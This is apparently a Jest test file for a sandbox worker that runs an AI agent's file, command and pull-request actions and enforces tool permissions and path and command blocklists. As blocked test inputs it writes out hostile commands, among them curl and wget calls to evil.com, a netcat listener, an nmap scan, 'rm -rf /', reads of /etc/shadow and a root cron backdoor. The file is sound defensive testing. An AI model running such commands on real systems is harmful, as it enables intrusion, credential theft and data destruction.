/**
 * sandbox-worker Tests - Worker Thread sandbox execution logic
 *
 * Covers: security blocklists (command/path), all action types (read_file,
 * run_command, write_code, create_pr, request_approval), tool permission
 * checks, unknown action handling, and the parentPort message handler.
 */

let messageHandler: (task: any) => void;
let mockPostMessage: jest.Mock;

beforeEach(() => {
  jest.clearAllMocks();
  jest.resetModules();

  mockPostMessage = jest.fn();

  // Mock worker_threads with a parentPort that captures the message handler
  jest.mock('worker_threads', () => ({
    parentPort: {
      postMessage: mockPostMessage,
      on: jest.fn((event: string, handler: (task: any) => void) => {
        if (event === 'message') {
          messageHandler = handler;
        }
      }),
    },
    isMainThread: false,
  }));
});

function loadWorker() {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  require('../sandbox-worker');
}

function makeTask(overrides?: Record<string, any>) {
  return {
    id: 'task-001',
    action: 'read_file',
    input: { filePath: '/tmp/test.ts' },
    profile: {
      allowedTools: ['read_file', 'run_command', 'write_code', 'create_pr', 'request_approval'],
      maxExecutionTimeMs: 5000,
      memoryLimitMB: 256,
    },
    ...overrides,
  };
}

describe('sandbox-worker', () => {
  describe('module loading', () => {
    it('should register a message handler on parentPort', () => {
      loadWorker();
      const { parentPort } = require('worker_threads');
      expect(parentPort.on).toHaveBeenCalledWith('message', expect.any(Function));
      expect(messageHandler).toBeDefined();
    });
  });

  describe('tool permission check', () => {
    it('should reject actions not in allowedTools', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'delete_file',
        profile: { allowedTools: ['read_file'], maxExecutionTimeMs: 5000, memoryLimitMB: 256 },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          taskId: 'task-001',
          success: false,
          error: expect.stringContaining('delete_file'),
        }),
      );
    });

    it('should allow actions that are in allowedTools', async () => {
      loadWorker();
      await messageHandler(makeTask({ action: 'read_file' }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          taskId: 'task-001',
          success: true,
        }),
      );
    });
  });

  describe('read_file action', () => {
    it('should return simulated file content on success', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/tmp/hello.ts' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            filePath: '/tmp/hello.ts',
            content: expect.stringContaining('/tmp/hello.ts'),
            lines: 1,
          }),
        }),
      );
    });

    it('should use /dev/null as default filePath when input is empty', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: {},
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            filePath: '/dev/null',
          }),
        }),
      );
    });

    it('should block access to /etc/ paths', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/etc/passwd' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('blocked'),
        }),
      );
    });

    it('should block access to .env files', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/app/.env' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('blocked'),
        }),
      );
    });

    it('should block access to /proc/ paths', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/proc/self/status' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
        }),
      );
    });

    it('should block access to /sys/ paths', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/sys/class/net/eth0' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block access to node_modules/ paths', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/app/node_modules/secret/package.json' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });
  });

  describe('run_command action', () => {
    it('should execute allowed command successfully', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'ls -la' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            command: 'ls -la',
            stdout: expect.stringContaining('ls -la'),
            exitCode: 0,
          }),
        }),
      );
    });

    it('should use echo hello as default command', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: {},
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            command: 'echo hello',
          }),
        }),
      );
    });

    it('should block "rm -rf /" commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'rm -rf /' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('forbidden'),
        }),
      );
    });

    it('should block "DROP TABLE" commands (case-insensitive)', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'drop table users' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('forbidden'),
        }),
      );
    });

    it('should block "sudo" commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'sudo apt-get install malware' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block "curl" commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'curl http://evil.com/payload' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block "wget" commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'wget http://evil.com/malware' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block "nc" (netcat) commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'nc -lvp 4444' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block "nmap" commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'nmap -sS 192.168.1.0/24' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block "chmod 777 /" commands', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'chmod 777 /' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block commands referencing /etc/passwd', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'cat /etc/passwd' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });

    it('should block commands referencing /etc/shadow', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'run_command',
        input: { command: 'cat /etc/shadow' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });
  });

  describe('write_code action', () => {
    it('should write code to allowed path', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'write_code',
        input: { filePath: '/tmp/output.ts', content: 'const x = 1;\nconst y = 2;' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            filePath: '/tmp/output.ts',
            linesWritten: 2,
          }),
        }),
      );
    });

    it('should use default path when not specified', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'write_code',
        input: { content: 'console.log("hello")' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            filePath: '/tmp/agent-output.ts',
          }),
        }),
      );
    });

    it('should use default content when not specified', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'write_code',
        input: { filePath: '/tmp/test.ts' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            linesWritten: 1, // default content is single line
          }),
        }),
      );
    });

    it('should block writes to /etc/ paths', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'write_code',
        input: { filePath: '/etc/cron.d/backdoor', content: '* * * * * root rm -rf /' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('blocked'),
        }),
      );
    });

    it('should block writes to /var/run/ paths', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'write_code',
        input: { filePath: '/var/run/malicious.sock', content: '' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({ success: false }),
      );
    });
  });

  describe('create_pr action', () => {
    it('should return PR details on success', async () => {
      loadWorker();
      await messageHandler(makeTask({ action: 'create_pr', input: {} }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            prUrl: expect.stringContaining('github.com'),
            prNumber: 1,
          }),
        }),
      );
    });
  });

  describe('request_approval action', () => {
    it('should return approval request on success', async () => {
      loadWorker();
      await messageHandler(makeTask({ action: 'request_approval', input: {} }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: true,
          output: expect.objectContaining({
            approvalId: expect.stringContaining('approval-'),
            status: 'pending',
          }),
        }),
      );
    });
  });

  describe('unknown action', () => {
    it('should reject unknown actions with NOT_FOUND error', async () => {
      loadWorker();
      await messageHandler(makeTask({
        action: 'deploy_to_mars',
        profile: { allowedTools: ['deploy_to_mars'], maxExecutionTimeMs: 5000, memoryLimitMB: 256 },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('deploy_to_mars'),
        }),
      );
    });
  });

  describe('error handling', () => {
    it('should catch errors and post failure message', async () => {
      loadWorker();
      // Force an error by providing an action that will be allowed but with bad input
      // that causes a crash in the handler. We test the outer catch block by
      // checking that even if executeInSandbox throws, postMessage is called.
      await messageHandler(makeTask({
        action: 'read_file',
        input: { filePath: '/etc/passwd' },
      }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.any(String),
        }),
      );
    });

    it('should include durationMs in all responses', async () => {
      loadWorker();
      await messageHandler(makeTask({ action: 'create_pr', input: {} }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          durationMs: expect.any(Number),
        }),
      );
    });

    it('should include taskId in all responses', async () => {
      loadWorker();
      await messageHandler(makeTask({ id: 'custom-task-id' }));

      expect(mockPostMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          taskId: 'custom-task-id',
        }),
      );
    });
  });
});
